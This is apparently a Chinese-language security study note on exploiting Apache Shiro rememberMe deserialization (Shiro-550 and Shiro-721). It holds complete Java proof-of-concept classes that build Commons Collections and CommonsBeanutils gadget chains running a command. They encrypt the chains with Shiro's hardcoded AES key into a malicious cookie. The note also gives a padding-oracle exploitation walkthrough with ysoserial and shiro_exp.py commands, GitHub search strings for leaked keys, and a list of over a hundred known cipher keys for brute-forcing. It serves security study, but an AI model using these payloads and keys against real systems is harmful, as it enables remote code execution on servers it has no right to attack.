        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(hashSet);

        // 将其转化为 shiro 攻击 payload
        AesCipherService aes = new AesCipherService();
        byte[] key = Base64.getDecoder().decode("kPH+bIxk5D2deZiIxcaaaA==");
        ByteSource encrypt = aes.encrypt(byteArrayOutputStream.toByteArray(), key);
        System.out.println(encrypt.toString());
    }
}
```

成功

![image-20220124112619178](img/image-20220124112619178.png)![image-20220124112619178](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220124112619178.png?lastModify=1646033842)

https://www.anquanke.com/post/id/192619

#### CommonsCollections 4.0 POC

使用CC2，因为其本身就没有使用到数组

```
package shiro;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;
import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.util.ByteSource;

import java.io.*;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.PriorityQueue;
import java.util.Queue;

public class CC2POC {
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static void main(String[] args) throws Exception {
        // 获取默认类池
        ClassPool pool = ClassPool.getDefault();
        CtClass cc2 = pool.makeClass("CC2");
        cc2.setSuperclass(pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"));
        cc2.makeClassInitializer().setBody("java.lang.Runtime.getRuntime().exec(\"calc.exe\");");
        byte[] code = cc2.toBytecode();

        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj,"_bytecodes",new byte[][]{code});
        setFieldValue(obj,"_name","test");
        setFieldValue(obj,"_tfactory",new TransformerFactoryImpl());

        InvokerTransformer transformer = new InvokerTransformer("toString", null, null);
        TransformingComparator comparator = new TransformingComparator(transformer);
        PriorityQueue queue = new PriorityQueue(2, comparator);
        queue.add(obj);
        queue.add(obj);

        setFieldValue(transformer,"iMethodName","newTransformer");

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(queue);
        

        // 将其转化为 shiro 攻击 payload
        AesCipherService aes = new AesCipherService();
        byte[] key = Base64.getDecoder().decode("kPH+bIxk5D2deZiIxcaaaA==");
        ByteSource encrypt = aes.encrypt(byteArrayOutputStream.toByteArray(), key);
        System.out.println(encrypt.toString());

    }
}
```

https://www.anquanke.com/post/id/192619

#### CommonsBeanutils POC

上述两个POC是在有`CommonsCollections`组件的情况下才能利用。

实际中，可能并没有这个组件存在，那么CC链自然无法利用了。

将项目 pom.xml 中 CC组件去掉，

![image-20220124130225680](img/image-20220124130225680.png)![image-20220124130225680](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220124130225680.png?lastModify=1646033842)

![image-20220124130148273](img/image-20220124130148273.png)![image-20220124130148273](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220124130148273.png?lastModify=1646033842)

发现`commons-beanutils` 依然存在，也就是或，shiro本身就是依赖 commons-beanutils 的。

那么尝试使用 CommonsBeanutils1 链进行攻击：

```
package shiro;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.beanutils.BeanComparator;
import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.util.ByteSource;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.PriorityQueue;

public class CB1 {
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static void main(String[] args) throws Exception {
        // 获取默认类池
        ClassPool pool = ClassPool.getDefault();
        CtClass cc2 = pool.makeClass("CC2");
        cc2.setSuperclass(pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"));
        cc2.makeClassInitializer().setBody("java.lang.Runtime.getRuntime().exec(\"calc.exe\");");
        byte[] code = cc2.toBytecode();

        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj,"_bytecodes",new byte[][]{code});
        setFieldValue(obj,"_name","test");
        setFieldValue(obj,"_tfactory",new TransformerFactoryImpl());

        BeanComparator comparator = new BeanComparator();
        PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
        queue.add(1);
        queue.add(1);

        setFieldValue(comparator,"property","outputProperties");
        setFieldValue(queue,"queue",new Object[]{obj,1});

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream outputStream = new ObjectOutputStream(byteArrayOutputStream);
        outputStream.writeObject(queue);
        outputStream.close();
        System.out.println(byteArrayOutputStream);

        // 将其转化为 shiro 攻击 payload
        AesCipherService aes = new AesCipherService();
        byte[] key = Base64.getDecoder().decode("kPH+bIxk5D2deZiIxcaaaA==");
        ByteSource encrypt = aes.encrypt(byteArrayOutputStream.toByteArray(), key);
        System.out.println(encrypt.toString());

    }
}
```

报错了

![image-20220124130741965](img/image-20220124130741965.png)![image-20220124130741965](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220124130741965.png?lastModify=1646033842)

**serialVersionUID** 的问题：

如果两个不同版本的库使用了同一个类，而这两个类可能有一些方法和属性有了变化，此时在序列化通信的时候就可能因为不兼容导致出现隐患。因此，Java在反序列化的时候提供了一个机制，序列化时会根据固定算法计算出一个当前类的 serialVersionUID 值，写入数据流中；反序列化时，如果发现对方的环境中这个类计算出的 serialVersionUID 不同，则反序列化就会异常退出，避免后续的未知隐患。

当然，开发者也可以手工给类赋予一个 serialVersionUID 值，此时就能手工控制兼容性了。所以，出现错误的原因就是，本地使用的commons-beanutils是1.9.4版本，而Shiro中自带的commons-beanutils是1.8.3版本，出现了 serialVersionUID 对应不上的问题。

![image-20220124131138739](img/image-20220124131138739.png)![image-20220124131138739](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220124131138739.png?lastModify=1646033842)

解决方法也比较简单，将本地的commons-beanutils也换成1.8.3版本

```
<dependency>
    <groupId>commons-beanutils</groupId>
    <artifactId>commons-beanutils</artifactId>
    <version>1.8.3</version>
</dependency>
```

替换后，又报错了

```
Unable to load ObjectStreamClass [org.apache.commons.collections.comparators.ComparableComparator: static final long serialVersionUID = -291439688585137865L;]: 
```

![image-20220124131523163](img/image-20220124131523163.png)![image-20220124131523163](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220124131523163.png?lastModify=1646033842)

没有找到`org.apache.commons.collections.comparators.ComparableComparator` ，这个类来自`commons.collections` 。

> commons-beanutils本来依赖于commons-collections，但是在Shiro中，它的commons-beanutils虽然包含了一部分commons-collections的类，但却不全。这也导致，正常使用Shiro的时候不需要依赖于commons-collections，但反序列化利用的时候需要依赖于commons-collections。

**所以此链无法利用。**

#### 无依赖Shiro反序列化利用链

这个类`org.apache.commons.collections.comparators.ComparableComparator` 在这里用到了

![image-20220124151312148](img/image-20220124151312148.png)![image-20220124151312148](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220124151312148.png?lastModify=1646033842)

在`BeanComparator` 构造函数处，没有显式传入`comparator` 时，默认使用`ComparableComparator` 。

我们此时需要找一个类来替换，需要满足：

- 实现`java.util.Comparator` 接口
- 实现`java.io.Serializable` 接口
- java， shiro ,或 Commons-beanutils 自带，且兼容性强

找到

![image-20220124152543278](img/image-20220124152543278.png)![image-20220124152543278](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220124152543278.png?lastModify=1646033842)

`java.lang.String` 内部私有类，满足要求

![image-20220124152618026](img/image-20220124152618026.png)![image-20220124152618026](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220124152618026.png?lastModify=1646033842)

通过`String.CASE_INSENSITIVE_ORDER` 拿到`CaseInsensitiveComparator` 。那么就可以构造POC

```
package shiro;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.beanutils.BeanComparator;
import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.util.ByteSource;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.PriorityQueue;

public class CB1POC {
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static void main(String[] args) throws Exception {
        // 获取默认类池
        ClassPool pool = ClassPool.getDefault();
        CtClass cc2 = pool.makeClass("CC2");
        cc2.setSuperclass(pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"));
        cc2.makeClassInitializer().setBody("java.lang.Runtime.getRuntime().exec(\"calc.exe\");");
        byte[] code = cc2.toBytecode();

        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj,"_bytecodes",new byte[][]{code});
        setFieldValue(obj,"_name","test");
        setFieldValue(obj,"_tfactory",new TransformerFactoryImpl());

        BeanComparator comparator = new BeanComparator(null,String.CASE_INSENSITIVE_ORDER);
        PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
        queue.add("1");
        queue.add("1");

        setFieldValue(comparator,"property","outputProperties");
        setFieldValue(queue,"queue",new Object[]{obj,1});

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream outputStream = new ObjectOutputStream(byteArrayOutputStream);
        outputStream.writeObject(queue);
        outputStream.close();
        System.out.println(byteArrayOutputStream);

        // 将其转化为 shiro 攻击 payload
        AesCipherService aes = new AesCipherService();
        byte[] key = Base64.getDecoder().decode("kPH+bIxk5D2deZiIxcaaaA==");
        ByteSource encrypt = aes.encrypt(byteArrayOutputStream.toByteArray(), key);
        System.out.println(encrypt.toString());

    }
}
```

成功：

![image-20220124153112746](img/image-20220124153112746.png)![image-20220124153112746](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220124153112746.png?lastModify=1646033842)

**类似的还有`java.util.Collections$ReverseComparator`**

参考：

Java安全漫谈 - 17.CommonsBeanutils与无commons-collections的Shiro反序列化利用.pdf

## 调试

#### 加密

Shiro≤1.2.4版本默认使用`CookieRememberMeManager`

![image-20220124154307647](img/image-20220124154307647.png)![image-20220124154307647](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220124154307647.png?lastModify=1646033842)

继承了`AbstractRememberMeManager` ,跟进看看

![image-20220124154346858](img/image-20220124154346858.png)![image-20220124154346858](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220124154346858.png?lastModify=1646033842)

这里有硬编码的密钥，

又继承了`RememberMeManager` ，跟进

![image-20220124154424317](img/image-20220124154424317.png)![image-20220124154424317](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220124154424317.png?lastModify=1646033842)

看名字也知道这是一些登录成功、失败、退出的一些接口，

那么我们在登录成功的法昂发处下断点

![image-20220124154939895](img/image-20220124154939895.png)![image-20220124154939895](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220124154939895.png?lastModify=1646033842)

调用`isRememberMe` 判断是否选择`Remember me`多选框，

![image-20220124155214120](img/image-20220124155214120.png)![image-20220124155214120](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220124155214120.png?lastModify=1646033842)

我们选择了，所以返回 true ，

跟进

```
this.rememberIdentity(subject, token, info);

subject:  存储一些登录信息，如 session等
token:  存储用户的账户密码，是否勾选多选框，host信息
info:   存储用户信息   
```

跟进`rememberIdentity` ，`this.getIdentityToRemember` 获取身份，

**PrincipalCollection**是一个身份集合。

![image-20220124155708771](img/image-20220124155708771.png)![image-20220124155708771](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220124155708771.png?lastModify=1646033842)

跟进`this.rememberIdentity`

![image-20220124155954033](img/image-20220124155954033.png)![image-20220124155954033](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220124155954033.png?lastModify=1646033842)

将身份信息使用`convertPrincipalsToBytes` 方法处理，跟进

![image-20220124164244804](img/image-20220124164244804.png)![image-20220124164244804](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220124164244804.png?lastModify=1646033842)

看到`serialize` 方法

![image-20220124164405844](img/image-20220124164405844.png)![image-20220124164405844](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220124164405844.png?lastModify=1646033842)

![image-20220124164804337](img/image-20220124164804337.png)![image-20220124164804337](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220124164804337.png?lastModify=1646033842)

这里先转换为 byte ，写入缓冲区，然后进行序列化。

回到`convertPrincipalsToBytes` ，进入`this.getCipherService()`

![image-20220124165233035](img/image-20220124165233035.png)![image-20220124165233035](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220124165233035.png?lastModify=1646033842)

这里

```
private CipherService cipherService = new AesCipherService();
```



![image-20220124165250213](img/image-20220124165250213.png)![image-20220124165250213](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220124165250213.png?lastModify=1646033842)

![image-20220124165344594](img/image-20220124165344594.png)![image-20220124165344594](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220124165344594.png?lastModify=1646033842)

不为空，进入 if

那么跟进`encrypt` ，

![image-20220124165514242](img/image-20220124165514242.png)![image-20220124165514242](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220124165514242.png?lastModify=1646033842)

这里获取加密服务后，进行加密

![image-20220124165811336](img/image-20220124165811336.png)![image-20220124165811336](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220124165811336.png?lastModify=1646033842)

```
this.getEncryptionCipherKey();  获取AES密钥，就是之前硬编码的key
```

具体加密操作不在跟进，

加密得到 set-Cookie rememberMe的值，

![image-20220124170126686](img/image-20220124170126686.png)![image-20220124170126686](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220124170126686.png?lastModify=1646033842)

回到`rememberIdentity` 

![image-20220124170246479](img/image-20220124170246479.png)![image-20220124170246479](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220124170246479.png?lastModify=1646033842)



跟进`rememberSerializedIdentity`

![image-20220124170402129](img/image-20220124170402129.png)![image-20220124170402129](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220124170402129.png?lastModify=1646033842)

是对 cookie进行的一些处理操作，

跟进`saveTo` ,最终添加 cookie 头。

![image-20220124170506146](img/image-20220124170506146.png)![image-20220124170506146](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220124170506146.png?lastModify=1646033842)

#### 解密

在`getRememberedPrincipals` 方法下断点，

进入断点

![image-20220124170915060](img/image-20220124170915060.png)![image-20220124170915060](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220124170915060.png?lastModify=1646033842)

跟进`getRememberedSerializedIdentity`

![image-20220124171358059](img/image-20220124171358059.png)![image-20220124171358059](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220124171358059.png?lastModify=1646033842)

到这里就是要读取 cookie值了，

跟进`readValue`

![image-20220124171452706](img/image-20220124171452706.png)![image-20220124171452706](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220124171452706.png?lastModify=1646033842)

跟进`getCookie` ，传参 name 为`rememberMe`

![image-20220124171918198](img/image-20220124171918198.png)![image-20220124171918198](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220124171918198.png?lastModify=1646033842)

得到传进来的cookie值，然后判断参数为`rememberMe`，进入 if ，返回 cookie。

回到`readValue`

![image-20220124172125946](img/image-20220124172125946.png)![image-20220124172125946](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220124172125946.png?lastModify=1646033842)

返回 cookie rememberMe的值。

回到`getRememberedSerializedIdentity`

![image-20220124172403371](img/image-20220124172403371.png)![image-20220124172403371](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220124172403371.png?lastModify=1646033842)



进入 esle if ,进行 base64解码，返回解码后的值

回到`rememberSerializedIdentity`

![image-20220124172553800](img/image-20220124172553800.png)![image-20220124172553800](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220124172553800.png?lastModify=1646033842)

跟进`convertBytesToPrincipals`

![image-20220124173231597](img/image-20220124173231597.png)![image-20220124173231597](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220124173231597.png?lastModify=1646033842)

`decrypt` 进行解密操作，跟进

![image-20220124173316908](img/image-20220124173316908.png)![image-20220124173316908](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220124173316908.png?lastModify=1646033842)

使用获得密码服务，然后使用AES密钥解密，最后返回解密后的字节。

回到`convertBytesToPrincipals` ，

![image-20220124173429430](img/image-20220124173429430.png)![image-20220124173429430](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220124173429430.png?lastModify=1646033842)

跟进`deserialize` ，应该是反序列化了，

![image-20220124173501872](img/image-20220124173501872.png)![image-20220124173501872](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220124173501872.png?lastModify=1646033842)

![image-20220124173549538](img/image-20220124173549538.png)![image-20220124173549538](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220124173549538.png?lastModify=1646033842)

将数据写入缓冲，然后反序列化`ois.readObject()` 。

成功命令执行

![image-20220124173635062](img/image-20220124173635062.png)![image-20220124173635062](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220124173635062.png?lastModify=1646033842)

链：

```
rememberMe的cookie值 --> Base64解码 --> AES解密 --> 反序列化
```

https://www.bilibili.com/read/cv9949257

## Shiro<1.4.2

**也叫Shiro 721。**

影响版本

```
1.2.5,  
1.2.6,  
1.3.0,  
1.3.1,  
1.3.2,  
1.4.0-RC2,  
1.4.0,  
1.4.1
```



#### 原理

**Shiro 1.2.5之后，shiro采用了随机密钥，也就引出了SHIRO-721。**

> Apache Shiro 存在高危代码执行漏洞。该漏洞是由于Apache Shiro cookie中通过 AES-128-CBC 模式加密的rememberMe字段存在问题，用户可通过Padding Oracle 加密生成的攻击代码来构造恶意的rememberMe字段，并重新请求网站，进行反序列化攻击，最终导致任意代码执行。

[Padding Oracle Attack实例分析](http://blog.zhaojie.me/2010/10/padding-oracle-attack-in-detail.html)

说明：

其中有一个重要的理论基础：Padding Oracle 攻击是应用/服务AES密文在 Padding(格式) 不对时能够有明显的区别，通过 padding 是否正确推断出中间值（每组中间值只和密文一一对应），这样就可以不用知道AES密钥时，构造密文，使之解密为我们想要的明文。

- 接受到正确的密文之后（填充正确且包含合法的值），应用程序正常返回（200 - OK）。
- 接受到非法的密文之后（解密后发现填充不正确），应用程序抛出一个解密异常（500 - Internal Server Error）。
- 接受到合法的密文（填充正确）但解密后得到一个非法的值，应用程序显示自定义错误消息（200 - OK）

接受到非法的密文之后（解密后发现填充不正确）和 合法的密文（填充正确）但解密后得到一个非法的值 响应不同。

#### 分析

Shiro对cookie的处理过程

![img](img/t019da937b7d4d60bda.png)![img](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/t019da937b7d4d60bda.png?lastModify=1646033842)

成功返回

![image-20220124191511716](img/image-20220124191511716.png)![image-20220124191511716](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220124191511716.png?lastModify=1646033842)

失败返回  `rememberMe=deleteMe;`

![image-20220124191532726](img/image-20220124191532726.png)![image-20220124191532726](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220124191532726.png?lastModify=1646033842)

所以我们需要首先获取到成功登录后的 rememberMe的值，然后利用 padding Oracle 构造自己的数据，来对比不同。

还有一个java trick:

**java序列化后 数据后添加脏数据不会影响反序列化结果。**

#### 环境搭建

https://github.com/inspiringz/Shiro-721

下载环境： https://github.com/apache/shiro/archive/refs/tags/shiro-root-1.4.1.zip

idea打开`shiro/sample/web` 目录，

添加tomcat，并进行配置一下就ok。

#### 漏洞利用

1. 登录网站（勾选Remember），并从Cookie中获取合法的RememberMe。
2. 使用RememberMe cookie作为Padding Oracle Attack的前缀。
3. 加密 ysoserial 的序列化 payload，以通过Padding Oracle Attack制作恶意RememberMe。
4. 重放恶意RememberMe cookie，以执行反序列化攻击。

成功登录拿到cookie

![image-20220207121440573](img/image-20220207121440573.png)![image-20220207121440573](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220207121440573.png?lastModify=1646033842)

使用 ysoserial 生成 urldns payload,

```
java8 -jar ysoserial-0.0.6-SNAPSHOT-all.jar URLDNS "http://m5v8rq.dnslog.cn" > urldns.ser
```

通过脚本[shiro_exp.py](https://github.com/inspiringz/Shiro-721/blob/master/shiro_exp.py) 爆破

```
python2 shiro_exp.py http://localhost:8080/ SFm/ZCRElAfEgLz8ciu9v2MVPpNbErTogOQ62L/J4zPEPbEaomvzY+fyiPG81J7XGN1HJA5Traa0yi87XXGwZMmNqoBGfPH/WRVtOdS7XLmv29XrzsNnctXlSrl/h9hs+C2mCZQ9D7SpeTYPue+ZCyuzau/wIMvMDdsUCrNMTQMqwcdDddQ+JoLgoWj4hV/SJD++TSX6szBLxZBcU/IdV99OU/Grd4weXjBnedqbvbS6ZrTYeCBDrqVBDeAtlBsDMt7AwvRDK+TGDBICWdp+X1M27xVrrrGbuDHVmVmwRv2xB4juVDE9TZmei1oQUPTjMfhiEzaM1cSI9io/IKX/LlOt7XL0pZbejbGreLmHv5nfJY584QEv1h5EX+iR6SdYnz36AlssmW9ZeUvkAPegKF8J/C4POhlhrQl1dXbHfssRugo0IPyjpS/ZyDxFAv1vXHPmHwp+vMy6M98ZhGrRCKeQAeAHl1ENKo9i59BnwxDIudZo3RYn66oMnAVrf2d0 urldns.ser
```

生成新的rememberMe的值，将其替换重放，dnslog即可收到请求。

![image-20220207123149256](img/image-20220207123149256.png)![image-20220207123149256](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220207123149256.png?lastModify=1646033842)

替换后发包即可收到请求

![image-20220207123307440](img/image-20220207123307440.png)![image-20220207123307440](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220207123307440.png?lastModify=1646033842)

注意将 sessionid删除掉，因为它也是认证字段，如果sessionId还有效，那么就不会触发认证流程。

#### 修复

在 1.4.2 之后将默认的AEC-CBC模式改为 AES-GCM

## 收集 key

在 github 上收集

```
securityManager.rememberMeManager.cipherKey

securityManager.setRememberMeManager(rememberMeManager);

Base64.decode(

Base64.decode( shiro

setCipherKey(Base64.decode(

securityManager.rememberMeManager.cipherKey=
```

key

```
fCq+/xW488hMTCD+cmJ3aQ==
kPH+bIxk5D2deZiIxcaaaA==
2AvVhdsgUs0FSA3SDFAdag==
3AvVhmFLUs0KTA3Kprsdag==
4AvVhmFLUs0KTA3Kprsdag==
5aaC5qKm5oqA5pyvAAAAAA==
6ZmI6I2j5Y+R5aSn5ZOlAA==
bWljcm9zAAAAAAAAAAAAAA==
wGiHplamyXlVB11UXWol8g==
Z3VucwAAAAAAAAAAAAAAAA==
MTIzNDU2Nzg5MGFiY2RlZg==
zSyK5Kp6PZAAjlT+eeNMlg==
U3ByaW5nQmxhZGUAAAAAAA==
5AvVhmFLUs0KTA3Kprsdag==
bXdrXl9eNjY2KjA3Z2otPQ==
1QWLxg+NYmxraMoxAXu/Iw==
ZUdsaGJuSmxibVI2ZHc9PQ==
L7RioUULEFhRyxM7a2R/Yg==
r0e3c16IdVkouZgk1TKVMg==
bWluZS1hc3NldC1rZXk6QQ==
a2VlcE9uR29pbmdBbmRGaQ==
WcfHGU25gNnTxTlmJMeSpw==
ZAvph3dsQs0FSL3SDFAdag==
tiVV6g3uZBGfgshesAQbjA==
cmVtZW1iZXJNZQAAAAAAAA==
ZnJlc2h6Y24xMjM0NTY3OA==
RVZBTk5JR0hUTFlfV0FPVQ==
WkhBTkdYSUFPSEVJX0NBVA==
GsHaWo4m1eNbE0kNSMULhg==
l8cc6d2xpkT1yFtLIcLHCg==
KU471rVNQ6k7PQL4SqxgJg==
0AvVhmFLUs0KTA3Kprsdag==
1AvVhdsgUs0FSA3SDFAdag==
25BsmdYwjnfcWmnhAciDDg==
3JvYhmBLUs0ETA5Kprsdag==
6AvVhmFLUs0KTA3Kprsdag==
6NfXkC7YVCV5DASIrEm1Rg==
7AvVhmFLUs0KTA3Kprsdag==
8AvVhmFLUs0KTA3Kprsdag==
8BvVhmFLUs0KTA3Kprsdag==
9AvVhmFLUs0KTA3Kprsdag==
OUHYQzxQ/W9e/UjiAGu6rg==
a3dvbmcAAAAAAAAAAAAAAA==
aU1pcmFjbGVpTWlyYWNsZQ==
bXRvbnMAAAAAAAAAAAAAAA==
OY//C4rhfwNxCQAQCrQQ1Q==
5J7bIJIV0LQSN3c9LPitBQ==
f/SY5TIve5WWzT4aQlABJA==
bya2HkYo57u6fWh5theAWw==
WuB+y2gcHRnY2Lg9+Aqmqg==
3qDVdLawoIr1xFd6ietnwg==
YI1+nBV//m7ELrIyDHm6DQ==
6Zm+6I2j5Y+R5aS+5ZOlAA==
2A2V+RFLUs+eTA3Kpr+dag==
6ZmI6I2j3Y+R1aSn5BOlAA==
SkZpbmFsQmxhZGUAAAAAAA==
2cVtiE83c4lIrELJwKGJUw==
fsHspZw/92PrS3XrPW+vxw==
XTx6CKLo/SdSgub+OPHSrw==
sHdIjUN6tzhl8xZMG3ULCQ==
O4pdf+7e+mZe8NyxMTPJmQ==
HWrBltGvEZc14h9VpMvZWw==
rPNqM6uKFCyaL10AK51UkQ==
Y1JxNSPXVwMkyvES/kJGeQ==
lT2UvDUmQwewm6mMoiw4Ig==
MPdCMZ9urzEA50JDlDYYDg==
xVmmoltfpb8tTceuT5R7Bw==
c+3hFGPjbgzGdrC+MHgoRQ==
ClLk69oNcA3m+s0jIMIkpg==
Bf7MfkNR0axGGptozrebag==
1tC/xrDYs8ey+sa3emtiYw==
ZmFsYWRvLnh5ei5zaGlybw==
cGhyYWNrY3RmREUhfiMkZA==
IduElDUpDDXE677ZkhhKnQ==
yeAAo1E8BOeAYfBlm4NG9Q==
cGljYXMAAAAAAAAAAAAAAA==
2itfW92XazYRi5ltW0M2yA==
XgGkgqGqYrix9lI6vxcrRw==
ertVhmFLUs0KTA3Kprsdag==
5AvVhmFLUS0ATA4Kprsdag==
s0KTA3mFLUprK4AvVhsdag==
hBlzKg78ajaZuTE0VLzDDg==
9FvVhtFLUs0KnA3Kprsdyg==
d2ViUmVtZW1iZXJNZUtleQ==
yNeUgSzL/CfiWw1GALg6Ag==
NGk/3cQ6F5/UNPRh8LpMIg==
4BvVhmFLUs0KTA3Kprsdag==
MzVeSkYyWTI2OFVLZjRzZg==
empodDEyMwAAAAAAAAAAAA==
A7UzJgh1+EWj5oBFi+mSgw==
c2hpcm9fYmF0aXMzMgAAAA==
i45FVt72K2kLgvFrJtoZRw==
U3BAbW5nQmxhZGUAAAAAAA==
Jt3C93kMR9D5e8QzwfsiMw==
MTIzNDU2NzgxMjM0NTY3OA==
vXP33AonIp9bFwGl7aT7rA==
V2hhdCBUaGUgSGVsbAAAAA==
Q01TX0JGTFlLRVlfMjAxOQ==
Is9zJ3pzNh2cgTHB4ua3+Q==
NsZXjXVklWPZwOfkvk6kUA==
GAevYnznvgNCURavBhCr1w==
66v1O8keKNV3TTcGPK1wzg==
SDKOLKn2J1j/2BHjeZwAoQ==
kPH+bIxk5D2deZiIxcabaA==
kPH+bIxk5D2deZiIxcacaA==
3AvVhdAgUs0FSA4SDFAdBg==
4AvVhdsgUs0F563SDFAdag==
FL9HL9Yu5bVUJ0PDU1ySvg==
5RC7uBZLkByfFfJm22q/Zw==
eXNmAAAAAAAAAAAAAAAAAA==
fdCEiK9YvLC668sS43CJ6A==
FJoQCiz0z5XWz2N2LyxNww==
HeUZ/LvgkO7nsa18ZyVxWQ==
HoTP07fJPKIRLOWoVXmv+Q==
iycgIIyCatQofd0XXxbzEg==
m0/5ZZ9L4jjQXn7MREr/bw==
NoIw91X9GSiCrLCF03ZGZw==
oPH+bIxk5E2enZiIxcqaaA==
QAk0rp8sG0uJC4Ke2baYNA==
Rb5RN+LofDWJlzWAwsXzxg==
s2SE9y32PvLeYo+VGFpcKA==
SrpFBcVD89eTQ2icOD0TMg==
U0hGX2d1bnMAAAAAAAAAAA==
Us0KvVhTeasAm43KFLAeng==
Ymx1ZXdoYWxlAAAAAAAAAA==
YWJjZGRjYmFhYmNkZGNiYQ==
zIiHplamyXlVB11UXWol8g==
ZjQyMTJiNTJhZGZmYjFjMQ==
